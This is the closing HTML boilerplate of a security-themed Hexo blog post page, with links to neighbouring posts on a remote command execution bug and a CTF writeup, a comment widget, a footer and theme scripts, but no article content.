    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/12/28/CodeFever%20Latest%20Remote%20Command%20Execute/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">CodeFever Latest Remote Command Execute</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/12/24/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Writeup/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">第六届安洵杯网络安全挑战赛 Writeup</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>